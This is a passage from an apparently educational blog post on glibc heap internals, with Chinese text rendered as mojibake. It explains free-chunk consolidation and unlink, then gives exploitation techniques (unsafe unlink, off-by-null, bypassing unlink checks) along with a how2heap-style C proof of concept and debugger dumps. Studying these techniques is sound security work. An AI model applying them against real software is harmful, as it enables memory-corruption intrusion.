inuse_bit_at_offset(p, s)      \</span></span><br><span class="line"><span class="meta">  (((mchunkptr) (((char *) (p)) + (s)))-&gt;mchunk_size &amp; PREV_INUSE)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Size of the chunk below P.  Only valid if !prev_inuse (P).  */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> prev_size(p) ((p)-&gt;mchunk_prev_size)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* consolidate backward */</span></span><br><span class="line"><span class="keyword">if</span> (!<span class="built_in">prev_inuse</span>(p)) &#123;</span><br><span class="line">  prevsize = <span class="built_in">prev_size</span>(p);</span><br><span class="line">  size += prevsize;</span><br><span class="line">  p = <span class="built_in">chunk_at_offset</span>(p, -((<span class="type">long</span>)prevsize));         <span class="comment">// p = p-prevsize,å°±æ˜¯å‰é¢çš„ chunk</span></span><br><span class="line">  <span class="keyword">if</span> (__glibc_unlikely(<span class="built_in">chunksize</span>(p) != prevsize))</span><br><span class="line">    <span class="built_in">malloc_printerr</span>(<span class="string">&quot;corrupted size vs. prev_size while consolidating&quot;</span>);</span><br><span class="line">  <span class="built_in">unlink_chunk</span>(av, p);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// nextchunk = chunk_at_offset(p, size);  å°±æ˜¯æ ¹æ®sizeè¿›è¡ŒåŠ æ³•ï¼Œæ˜¯ä¸€ä¸ªå®ï¼Œå°±æ˜¯å½“å‰chunkçš„ä¸‹ä¸€ä¸ªchunk</span></span><br><span class="line"><span class="comment">// nextsize = chunksize(nextchunk); </span></span><br><span class="line"><span class="keyword">if</span> (nextchunk != av-&gt;top) &#123;</span><br><span class="line">  <span class="comment">/* get and clear inuse bit */</span></span><br><span class="line">  nextinuse = <span class="built_in">inuse_bit_at_offset</span>(nextchunk, nextsize);</span><br><span class="line"></span><br><span class="line"><span class="comment">/* consolidate forward */</span></span><br><span class="line"><span class="keyword">if</span> (!nextinuse) &#123;</span><br><span class="line">  <span class="built_in">unlink_chunk</span>(av, nextchunk);    <span class="comment">// å½“å‰çš„ arena å’Œ next_chunk ä½¿ç”¨æŒ‡é’ˆè¿æ¥</span></span><br><span class="line">  size += nextsize;</span><br><span class="line">&#125; <span class="keyword">else</span></span><br><span class="line">  <span class="built_in">clear_inuse_bit_at_offset</span>(nextchunk, <span class="number">0</span>);</span><br></pre></td></tr></table></figure><p>unlinkå‡½æ•°ä¸»è¦æ˜¯æŒ‡é’ˆçš„å¤„ç†ï¼Œå‡è®¾3ä¸ªchunkï¼Œa-b-cï¼Œa-båœ¨unsortedbin èŒƒå›´ï¼Œcä¸»è¦é˜²æ­¢top_chunkåˆå¹¶ï¼Œæ­£å¸¸æƒ…å†µä¸‹</p><ul><li>é¦–å…ˆï¼Œunsorted bin æŒ‰ç…§freeæ—¶é—´é¡ºåºè¿æ¥ï¼ŒfdæŒ‡å‘æ—¶é—´é å‰çš„chunkã€‚</li><li>å‘å‰åˆå¹¶ï¼šfree b, free aã€‚å…ˆæˆä¸º arena&lt;-&gt;b åŒé“¾è¡¨ï¼Œç„¶ååœ¨è°ƒç”¨ unlink(av, b)ã€‚</li><li>å‘ååˆå¹¶ï¼šfree a, free bã€‚å…ˆæˆä¸º arena&lt;-&gt;a åŒé“¾è¡¨ åœ¨int_free è°ƒç”¨çš„æ˜¯ unlink(av, a)ã€‚</li><li>è¿™é‡Œå°±ä½¿ç”¨å‘ååˆå¹¶ä¸¾ä¾‹ï¼šfd&#x3D;a-&gt;fd&#x3D;arena, bk&#x3D;a-&gt;bk&#x3D;arenaï¼›åœ¨ç»å†ä¸€ä¸ªèµ‹å€¼è¯­å¥å˜ä¸º arena-&gt;bk&#x3D;arenaï¼Œareba-&gt;fd&#x3D;arenaã€‚ä»arena&lt;-&gt;a å˜æˆäº† arena å®Œæˆunlinkæ­¤æ“ä½œã€‚</li></ul><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">static</span> <span class="type">void</span> <span class="title">unlink_chunk</span><span class="params">(mstate av, mchunkptr p)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (<span class="built_in">chunksize</span>(p) != <span class="built_in">prev_size</span>(<span class="built_in">next_chunk</span>(p)))</span><br><span class="line">    <span class="built_in">malloc_printerr</span>(<span class="string">&quot;corrupted size vs. prev_size&quot;</span>);</span><br><span class="line"></span><br><span class="line">  mchunkptr fd = p-&gt;fd;</span><br><span class="line">  mchunkptr bk = p-&gt;bk;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (__builtin_expect(fd-&gt;bk != p || bk-&gt;fd != p, <span class="number">0</span>))</span><br><span class="line">    <span class="built_in">malloc_printerr</span>(<span class="string">&quot;corrupted double-linked list&quot;</span>);</span><br><span class="line"></span><br><span class="line">  fd-&gt;bk = bk;</span><br><span class="line">  bk-&gt;fd = fd;</span><br><span class="line">  <span class="keyword">if</span> (!<span class="built_in">in_smallbin_range</span>(<span class="built_in">chunksize_nomask</span>(p)) &amp;&amp; p-&gt;fd_nextsize != <span class="literal">NULL</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (p-&gt;fd_nextsize-&gt;bk_nextsize != p || p-&gt;bk_nextsize-&gt;fd_nextsize != p)</span><br><span class="line">      <span class="built_in">malloc_printerr</span>(<span class="string">&quot;corrupted double-linked list (not small)&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (fd-&gt;fd_nextsize == <span class="literal">NULL</span>) &#123;</span><br><span class="line">      <span class="keyword">if</span> (p-&gt;fd_nextsize == p)</span><br><span class="line">        fd-&gt;fd_nextsize = fd-&gt;bk_nextsize = fd;</span><br><span class="line">      <span class="keyword">else</span> &#123;</span><br><span class="line">        fd-&gt;fd_nextsize = p-&gt;fd_nextsize;</span><br><span class="line">        fd-&gt;bk_nextsize = p-&gt;bk_nextsize;</span><br><span class="line">        p-&gt;fd_nextsize-&gt;bk_nextsize = fd;</span><br><span class="line">        p-&gt;bk_nextsize-&gt;fd_nextsize = fd;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      p-&gt;fd_nextsize-&gt;bk_nextsize = p-&gt;bk_nextsize;</span><br><span class="line">      p-&gt;bk_nextsize-&gt;fd_nextsize = p-&gt;fd_nextsize;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ç„¶ååç»­ç»§ç»­è¿›å…¥freeå‡½æ•°é‡Œæ“ä½œ</p><ul><li>åç»­æ“ä½œï¼šæ­¤æ—¶pæŒ‡å‘aï¼Œæ‰¾åˆ°arenaçš„binsæ•°ç»„ï¼Œç„¶åé“¾å…¥arenaï¼Œè®¾ç½®headå’Œfoot</li></ul><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Set size/use field */</span></span><br><span class="line"><span class="comment">// è®¾ç½®sizeç½¢äº†</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> set_head(p, s)       ((p)-&gt;mchunk_size = (s))</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Set size at footer (only when chunk is not in use) */</span></span><br><span class="line"><span class="comment">// è®¾ç½®ä¸‹ä¸€ä¸ªchunkçš„prev_size</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> set_foot(p, s) Â  Â  Â  (((mchunkptr) ((char *) (p) + (s)))-&gt;mchunk_prev_size = (s))</span></span><br><span class="line"></span><br><span class="line">bck = <span class="built_in">unsorted_chunks</span>(av);</span><br><span class="line">fwd = bck-&gt;fd;</span><br><span class="line"><span class="keyword">if</span> (__glibc_unlikely(fwd-&gt;bk != bck))</span><br><span class="line">  <span class="built_in">malloc_printerr</span>(<span class="string">&quot;free(): corrupted unsorted chunks&quot;</span>);</span><br><span class="line">p-&gt;fd = fwd;</span><br><span class="line">p-&gt;bk = bck;</span><br><span class="line"><span class="keyword">if</span> (!<span class="built_in">in_smallbin_range</span>(size)) &#123;</span><br><span class="line">  p-&gt;fd_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">  p-&gt;bk_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line">bck-&gt;fd = p;</span><br><span class="line">fwd-&gt;bk = p;</span><br><span class="line"></span><br><span class="line"><span class="built_in">set_head</span>(p, size | PREV_INUSE);</span><br><span class="line"><span class="built_in">set_foot</span>(p, size);</span><br><span class="line"></span><br><span class="line"><span class="built_in">check_free_chunk</span>(av, p);</span><br></pre></td></tr></table></figure><p>æœ€åï¼šarenaçš„binsæ•°ç»„å­˜æ”¾æ•°æ®ï¼š</p><ul><li>è¿™æ ·æ¶‰åŠå°±å¥½åƒæœ‰fdï¼ŒbkæŒ‡é’ˆã€‚</li></ul><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bins[<span class="number">1</span>] = bins[<span class="number">0</span>] = &amp;bins - <span class="number">0x10</span></span><br></pre></td></tr></table></figure><h2 id="Attack"><a href="#Attack" class="headerlink" title="Attack"></a>Attack</h2><p>ç›¸å…³çš„æ”»å‡»æ‰‹æ®µã€‚</p><h3 id="uaf"><a href="#uaf" class="headerlink" title="uaf"></a>uaf</h3><p>æ—©æœŸå‘ç°æ­¤æ¼æ´æ—¶ï¼Œæ²¡æœ‰ <code>fd-&gt;bk != p || bk-&gt;fd != p</code> è¿™ä¸ªæ¡ä»¶ï¼Œå› æ­¤ç›´æ¥ä¿®æ”¹ fd, bk æ¥è¿›è¡Œä»»æ„åœ°å€å†™</p><ul><li>ä»»æ„åœ°å€å†™ï¼Œå¦‚æœå¼€äº† got è¡¨ä¿æŠ¤ï¼Œå¯ä»¥å†™ hookã€‚</li></ul><h3 id="unsafe-unlink"><a href="#unsafe-unlink" class="headerlink" title="unsafe unlink"></a>unsafe unlink</h3><p>åœ¨æ²¡æœ‰ PIE å’Œ gotè¡¨å¯ä»¥å†™æ—¶ï¼Œå¯ä»¥é€šè¿‡ä¿®æ”¹gotè¡¨ã€‚å…¶æœ¬è´¨æ˜¯ä¸€ä¸ªheap overflowè¿™æ˜¯æ¯”è¾ƒç®€å•çš„ã€‚</p><ul><li>ä¸»è¦æ˜¯åˆ©ç”¨ unlink ä¸­çš„ä»£ç ï¼Œå…¶ä¸­æŒ‡é’ˆèµ‹å€¼ç®€åŒ–ä¸º <code>p-&gt;fd-&gt;bk = p-&gt;bk, p-&gt;bk-&gt;fd = p-&gt;fd</code></li><li>æˆ‘ä»¬æ§åˆ¶è¿™ä¸ª p çš„å†…å®¹ã€‚</li></ul><ol><li>æŒ‰ç…§æ—¶é—´ malloc A,B</li><li>A å †æº¢å‡ºï¼Œä¿®æ”¹Açš„å†…å®¹ ä¿®æ”¹Bçš„header</li></ol><ul><li>target &#x3D; &amp;pï¼Œéœ€è¦æˆ‘ä»¬å¯ä»¥å†™ã€‚æˆ–è€… targetå°±æ˜¯p</li><li>æˆ‘ä»¬åœ¨ A é‡Œä¼ªé€ ä¸€ä¸ª fake free chunk: prev_inuse, size, <em>fd&#x3D;&amp;target-0x18, bk&#x3D;&amp;target&#x3D;0x10</em></li><li>åˆ©ç”¨å †æº¢å‡ºä¿®æ”¹ B çš„headerï¼Œè®©fake free chunk å’Œ B å¯ä»¥åˆå¹¶ã€‚</li></ul><ol start="3"><li>free B å°±ä¼š unlinkï¼Œ<strong>p å°±æ˜¯ fake free chunk</strong>ï¼Œè§¦å‘unlinkã€‚</li></ol><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">+---------+                     +----------+ </span><br><span class="line">|         |                     |          |</span><br><span class="line">|    A    |                     +----------+                    </span><br><span class="line">|         |                     |          |  Aä¸­ä¼ªé€  =&gt; fake heap head(sz, fd, bk) + data </span><br><span class="line">|         |                     |fake heap |</span><br><span class="line">|         |                     |          |</span><br><span class="line">+---------+  ==heap overflow===&gt;+----------+   ===========================&gt; free B =&gt; unlink</span><br><span class="line">|         |                     |ps     sz |</span><br><span class="line">|         |                     |          |  B head =&gt; prev size è¿‡æ£€æŸ¥</span><br><span class="line">|   B     |                     |          |            prev_inuse ä¸º0</span><br><span class="line">|         |                     |          |</span><br><span class="line">+---------+                     +----------+</span><br></pre></td></tr></table></figure><p>how2heap æ¡ˆä¾‹</p><ul><li>ç¼–è¯‘æ—¶æŒ‡å®šno-pie</li><li>æµ‹è¯•åœ¨ubuntu 22.04ï¼Œå¯ä»¥é€šè¿‡assert.</li></ul><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">uint64_t</span> *chunk0_ptr;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="built_in">setbuf</span>(stdout, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">  <span class="type">int</span> malloc_size = <span class="number">0x420</span>;</span><br><span class="line">  <span class="type">int</span> header_size = <span class="number">2</span>;</span><br><span class="line"></span><br><span class="line">  chunk0_ptr = (<span class="type">uint64_t</span> *)<span class="built_in">malloc</span>(malloc_size);            <span class="comment">// chunk0</span></span><br><span class="line">  <span class="type">uint64_t</span> *chunk1_ptr = (<span class="type">uint64_t</span> *)<span class="built_in">malloc</span>(malloc_size);  <span class="comment">// chunk1</span></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;The global chunk0_ptr is at %p, pointing to %p\n&quot;</span>, &amp;chunk0_ptr,</span><br><span class="line">         chunk0_ptr);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;The victim chunk we are going to corrupt is at %p\n\n&quot;</span>, chunk1_ptr);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// fake_head</span></span><br><span class="line">  chunk0_ptr[<span class="number">1</span>] = chunk0_ptr[<span class="number">-1</span>] - <span class="number">0x10</span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// fake fd &amp;&amp; fake bk</span></span><br><span class="line">  chunk0_ptr[<span class="number">2</span>] = (<span class="type">uint64_t</span>)&amp;chunk0_ptr - (<span class="built_in">sizeof</span>(<span class="type">uint64_t</span>) * <span class="number">3</span>);</span><br><span class="line">  chunk0_ptr[<span class="number">3</span>] = (<span class="type">uint64_t</span>)&amp;chunk0_ptr - (<span class="built_in">sizeof</span>(<span class="type">uint64_t</span>) * <span class="number">2</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Fake chunk fd: %p\n&quot;</span>, (<span class="type">void</span> *)chunk0_ptr[<span class="number">2</span>]);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Fake chunk bk: %p\n\n&quot;</span>, (<span class="type">void</span> *)chunk0_ptr[<span class="number">3</span>]);</span><br><span class="line">  </span><br><span class="line">  <span class="comment">// chunk1 çš„ header æŒ‡é’ˆ</span></span><br><span class="line">  <span class="type">uint64_t</span> *chunk1_hdr = chunk1_ptr - header_size;</span><br><span class="line">  <span class="comment">// chunk1 -&gt; prev_size</span></span><br><span class="line">  chunk1_hdr[<span class="number">0</span>] = malloc_size;   </span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(</span><br><span class="line">      <span class="string">&quot;If we had &#x27;normally&#x27; freed chunk0, chunk1.previous_size would have been &quot;</span></span><br><span class="line">      <span class="string">&quot;0x430, however this is its new value: %p\n&quot;</span>,</span><br><span class="line">      (<span class="type">void</span> *)chunk1_hdr[<span class="number">0</span>]);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// prev_inuse ä¸º 0</span></span><br><span class="line">  chunk1_hdr[<span class="number">1</span>] &amp;= ~<span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// unlink å‘ç”Ÿ</span></span><br><span class="line">  <span class="comment">// chunk0_ptr-&gt;fd = &amp;chunk0_ptr-0x18</span></span><br><span class="line">  <span class="comment">// ä¿®æ”¹chunk0_ptr å¯ä»¥ä¿®æ”¹ *(chunk0_ptr - 0x18 )çš„å€¼</span></span><br><span class="line">  <span class="built_in">free</span>(chunk1_ptr);</span><br><span class="line"></span><br><span class="line">  <span class="type">char</span> victim_string[<span class="number">8</span>];</span><br><span class="line">  <span class="built_in">strcpy</span>(victim_string, <span class="string">&quot;Hello!~&quot;</span>);</span><br><span class="line">  chunk0_ptr[<span class="number">3</span>] = (<span class="type">uint64_t</span>)victim_string;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Original value: %s\n&quot;</span>, victim_string);</span><br><span class="line">  chunk0_ptr[<span class="number">0</span>] = <span class="number">0x4141414142424242</span>LL;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;New Value: %s\n&quot;</span>, victim_string);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// sanity check</span></span><br><span class="line">  <span class="built_in">assert</span>(*(<span class="type">long</span> *)victim_string == <span class="number">0x4141414142424242</span>L);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æ¯”è¾ƒç»•ï¼Œä½†æ˜¯å¯ä»¥ç›´æ¥çœ‹æœ€åçš„ç»“æœï¼Œ<code>chunk0_ptr-&gt;bk-&gt;fd = chunk0_ptr-&gt;fd</code>ã€‚target çš„å†…å®¹å­˜æ”¾ç€ <code>&amp;target-0x10</code> targetçš„åœ°å€å‡å»0x18</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># chunk0_ptr å †åœ°å€</span></span><br><span class="line">pwndbg&gt; x/8xg 0x405290  </span><br><span class="line">0x405290:       0x0000000000000000      0x0000000000000431</span><br><span class="line">0x4052a0:       0x0000000000000000      0x0000000000020d61</span><br><span class="line">0x4052b0:       0x0000000000404050      0x0000000000404058    <span class="comment"># fake_fd fake_bk</span></span><br><span class="line">0x4052c0:       0x0000000000000000      0x0000000000000000</span><br><span class="line"></span><br><span class="line"><span class="comment"># &amp;chunk0_ptr</span></span><br><span class="line"><span class="comment"># (&amp;chunk0_ptr - 0x10) -&gt; fd = fake_fd</span></span><br><span class="line">pwndbg&gt; x/8xg 0x0000000000404058+0x10   </span><br><span class="line">0x404068 &lt;chunk0_ptr&gt;:  0x0000000000404050      0x0000000000000000</span><br><span class="line">0x404078:       0x0000000000000000      0x0000000000000000</span><br><span class="line">0x404088:       0x0000000000000000      0x0000000000000000</span><br><span class="line">0x404098:       0x0000000000000000      0x0000000000000000</span><br></pre></td></tr></table></figure><p>ç»“è®ºï¼štarget æŒ‡é’ˆæŒ‡å‘ &amp;target-0x18ã€‚æˆ‘è§è¿‡çš„é—®é¢˜ä¸€èˆ¬åˆ©ç”¨åœ¨å…¨å±€æŒ‡é’ˆæ•°ç»„ä¸­ï¼Œé€šè¿‡è¿™ç§æ–¹å¼ä¿®æ”¹gotè¡¨å†…å®¹ã€‚<br>æ”¹<code>arr[0]</code>ï¼Œè¿™æ ·å°±å¯ä»¥ä¿®æ”¹å’Œè¯»å– <code>arr[0]</code> ã€‚æ”¹æˆgotè¡¨ï¼Œè¯»å–å†…å®¹ï¼Œæ³„éœ²åœ°å€ï¼Œåˆå¯ä»¥ä¿®æ”¹å°±ç›´æ¥ä¿®æ”¹gotè¡¨å†…å®¹ã€‚<br><del>æ²¡æœ‰æ‰€æœ‰æƒçš„ç¼–ç¨‹æ˜¯è¿™æ ·çš„</del></p><h3 id="off-by-null"><a href="#off-by-null" class="headerlink" title="off by null"></a>off by null</h3><p>ä¹Ÿæ˜¯å †æº¢å‡ºçš„ä¸€ç§å½¢å¼ï¼Œä½†è¿˜æ˜¯åŒºåˆ†ä¸€ä¸‹ã€‚åœ¨è¿™é‡Œå¯ä»¥æ”»å‡»ä¿æŠ¤å…¨å¼€çš„ç¨‹åºï¼Œä¸»è¦åˆ©ç”¨ç‚¹ä¸ºå †å¯ä»¥åˆå¹¶ã€‚</p><p>libc2.29 ä»¥å‰</p><ul><li>å…ˆé‡Šæ”¾chunk A.</li><li>é€šè¿‡chunk B,åˆ©ç”¨off by oneæ¼æ´åœ¨ ä¿®æ”¹chunk C presize å€¼ä¸º chunk A size +chunk B sizeçš„åŒæ—¶,å°†chunk Cçš„prev_inuseå€¼è¦†ç›–ä¸º0.</li><li>å†é‡Šæ”¾chunk Cã€‚</li></ul><p>libc2.29 ä»¥åæœ‰ä¸ªæ£€æŸ¥ï¼Œä¼šæ£€æŸ¥prev_chunk sizeæ˜¯å¦å’Œå½“å‰çš„ chunk çš„ prev_size ç›¸åŒï¼Œè€Œ off by nullï¼Œæˆ‘ä»¬æ— æ³•ç›´æ¥æ”¹å˜ chunk sizeï¼Œå› æ­¤æˆ‘ä»¬åœ¨chunké‡Œä¼ªé€ ä¸€ä¸ªchunk</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (__glibc_unlikely(<span class="built_in">chunksize</span>(p) != prevsize))</span><br></pre></td></tr></table></figure><p>ä¿®æ”¹åçš„off by nullåˆ©ç”¨æ‰‹æ®µï¼Œå› ä¸ºæ²¡æœ‰arenaçš„æ£€æŸ¥ï¼Œåªæ˜¯æ£€æŸ¥äº†in_useä½å’Œsizeç›¸å…³æ£€æŸ¥</p><ul><li>ä¸‰ä¸ªå † Aï¼ŒBï¼ŒCï¼Œæœ€å¥½æ˜¯ 0x438 è¿™ç§ä¸æ˜¯æ•´æ•°ç±»å‹çš„ï¼Œä¼šå­˜åœ¨ä¸€æ®µå…¬ç”¨çš„ç»“æœã€‚cé˜²æ­¢ä¸top_chunkåˆå¹¶</li><li>ç¼–è¾‘Aï¼Œåœ¨Aä¸­<strong>ä¼ªé€ ä¸€ä¸ªå †</strong>ï¼Œè¦†ç›–æ‰Bçš„prev_inuse ä½</li><li>freeæ‰Bï¼Œå°±ä¼šå‘ååˆå¹¶ã€‚</li><li>ä½†æ˜¯éœ€è¦ç»•è¿‡unlink_chunkä¸­å¯¹fd, bkæ£€æŸ¥ <code>__builtin_expect(fd-&gt;bk != p || bk-&gt;fd != p, 0)</code>ã€‚</li></ul><p>ç®€å•ç‚¹çš„é¢˜ç›®ä¼šç»™æˆ‘ä»¬ä¸€ä¸ªåŸºåœ°å€ï¼Œè¿™é‡Œæˆ‘ä»¬å°±å¯ä»¥ç›´æ¥åƒunlinkä¸€æ ·ä¿®æ”¹fd,bkå°±è¡Œ</p><ul><li>tcache leak åœ¨libc 2.32 éœ€è¦ <code>(fd&gt;&gt;12) ^ 0</code></li><li>unsorted bin å­˜åœ¨ä¸¤ä¸ªchunkï¼Œæ³„éœ²å…¶ä¸­ä¸€ä¸ªçš„ fd,bkå¯ä»¥å¾—åˆ°å †åœ°å€</li><li>largebin çš„å››ä¸ªæŒ‡é’ˆï¼Œåªæœ‰ä¸€ä¸ªchunkå¯ä»¥ä½¿ç”¨fd_nextsize å’Œ bk_nextsizeæŒ‡å‘è‡ªå·±</li></ul><p>åœ¨æ¯”è¾ƒè‹›åˆ»çš„æ¡ä»¶ä¸‹ï¼Œæˆ‘ä»¬ä¸èƒ½æ³„éœ²å †åœ°å€ï¼Œä½†æ˜¯å¯ä»¥é€šè¿‡å¸ƒå±€heap fengshui è¿›è¡Œä¼ªé€ fake chunkã€‚å‡è®¾ç¨‹åºå­˜åœ¨off by null</p><ul><li>a-x-b-c-x-d-x, a,b,c,d å¤§å°éƒ½åœ¨unsorted biné‡Œï¼Œxæ˜¯é¿å…åˆå¹¶çš„chunk ï¼ˆc&gt;d&gt;a&#x3D;bï¼‰</li><li>free a, c, d æ‹¿fdæ¥è¯´å°±æ˜¯å½¢æˆ d-&gt;c-&gt;a-&gt;arena çš„é“¾è¡¨ã€‚</li><li>free b è¿™æ—¶å€™b,cåˆå¹¶ã€‚å˜æˆäº† b-&gt;d-&gt;a-&gt;arena é“¾è¡¨ï¼Œä½†æ˜¯è¿™æ—¶å€™cçš„æŒ‡é’ˆå¹¶æ²¡æœ‰æ¸…é™¤ã€‚</li><li>unsorted bin FIFOã€‚æ­¤å¤„éœ€è¦å°† aï¼Œdæ”¾å…¥largebiné‡Œï¼Œç„¶ååˆ‡å‰² b-cï¼Œç”Ÿæˆeï¼ŒeåŒ…å«cçš„ fd, bkæŒ‡é’ˆã€‚</li><li>æ¸…ç©ºunsorted bin è·å¾—f</li><li>ç¼–è¾‘ eï¼Œå¯ä»¥æ”¹åŸæ¥cä½ç½®çš„sizeï¼Œå¹¶ä¸”åŒæ—¶åŒ…å«äº†fd, bk æŒ‡é’ˆã€‚å› æ­¤æ­¤å¤„æˆ‘ä»¬éœ€è¦æ”¹ä¸€ç‚¹å®Œæˆunlinkä¸­çš„æ£€æŸ¥ã€‚</li><li>ä¹‹å‰chunk c-&gt;fd&#x3D;a, c-&gt;bk&#x3D;dã€‚å› ä¸ºå…¶æ”¾å…¥äº†largebiné‡Œ a-&gt;bk &#x3D; dï¼Œ d-&gt;fd &#x3D; aï¼Œæ— æ³•é€šè¿‡æ£€æŸ¥ï¼Œå› æ­¤æˆ‘ä»¬éœ€è¦æƒ³åŠæ³•æ»¡è¶³æ¡ä»¶</li><li>å°†a,dä»large bin æ‹¿å‡ºæ¥ã€‚</li><li>bypass bkæŒ‡é’ˆï¼šfree a, free fã€‚a-&gt;bk &#x3D; f, å°†aæ‹¿å‡ºæ¥ï¼Œä¸ä¼šæ¸…ç©ºæŒ‡é’ˆï¼Œä¿®æ”¹ä¸€ä¸‹bkæŒ‡é’ˆï¼Œå› ä¸ºfå’Œcè·ç¦»æ¯”è¾ƒè¿‘ï¼Œå› æ­¤æˆ‘ä»¬å¯ä»¥é€šè¿‡partial writeä¿®æ”¹bk</li><li>bypass fdæŒ‡é’ˆ: ç›´æ¥å‘bypass bkä¸€æ ·ï¼ŒbkæŒ‡å‘çš„æ˜¯arenaã€‚free f, free 